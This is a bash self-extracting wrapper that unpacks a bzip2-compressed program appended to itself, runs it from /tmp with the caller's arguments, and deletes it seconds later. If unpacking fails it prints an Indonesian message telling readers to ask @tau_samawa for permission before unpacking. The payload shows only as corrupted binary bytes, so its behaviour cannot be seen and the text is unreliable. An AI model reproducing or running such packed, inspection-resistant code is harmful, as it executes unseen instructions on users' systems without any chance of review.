#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�>z R_�ax���?�������@D@  P�K��hj�J4&L���hSz$�&�2yF�M�ц��Ѝ42i�M �&��@  ɐ$�I�z�4h hF�@   ��i�@�ɠ d�  2dA$D4i����ɠ�OS�4��<� ��G�44�HP1�z\���m	�[���s�s��3zN��hE#�5�<A�$�X;"EeDG��M~�����ŏ������0z\f _�dԿ�e0���,�5�RC;K�����e����]ٌ�k�o~/0��b��1�g��z ���� ߧ��š����6���9��Ժ����4��WɾSp���o^x�W`���LADpw��� !!:A|ࠉ�
s]��)�CK�Bi;�-mQ��Ԁ&v��˟�ٽCO@�� :��)� ϓ�gX�1YY�����{� "k� � �u8�	3�#�wL�����z��>7큶��J��	2çQQj�>5�G��Zd���V0ĽZX��3��*�Ȍ�y��Ma*�:�G���2Io���$�üw9��`��R.�C9��)�U��
�,J�7ዔkJj8�QUG'H��]��s&��نg�\-��S��c�ۭhd�8�7�	�@��#���^ h��,�V V����^q�~��+�]j��ܭ1���z>ǥ�f����(�]�A���5�� H�"M��ƴxΎ��lOo�u�C�fزE�S����C�uPZ�%gw�	��[�L`c`tVc��>z�����>P�k�n�m#I�HřѕÝ������`@�EOO@y�M��'S�\�O�0 (ȩ�U�1D� �0����`� r*X*��%��>��m�� r��I.+��J<�P� Cb�����C�I��Z��-ą^@�.X�2w�j�E�pwx����6��l�*�Mq��}��H9
�W��H$L�t�:KsmQ/\E�j��C<�^o�m���
�AɁ18����}5p#����0nY�M�$��v�r�h�bH����f3�����dt�\L4�É��EB$P�3R_	ȤWN
�%��dE��4Q�.��!9�eP.�,
G�H8�z� l�l⢅B�k�W-�� �4i���/'D'�QS#y3T@�<e!*��T�L"�"�R�@W�)�y��s`�P�R�r�ݳ X2l8[ ���Tx��Lv�q��l妑�.�#b��4H�^��Y0R�R�N/d+<3� ��d��X�0w��8R�K H�Š�6���
���MVD�a�R@a�a��M�!8Il5B��1K-T��*Ec+'����x���"#ylA@W8)����e�J���0�E�b(����-f����HL��ѱ`�Un���%S>�'""0K22��p�+f�J�F�-������SH���)_o�Y,��3.~뷳���Oh@�;L��ÀJ0��w$S�	
C�'�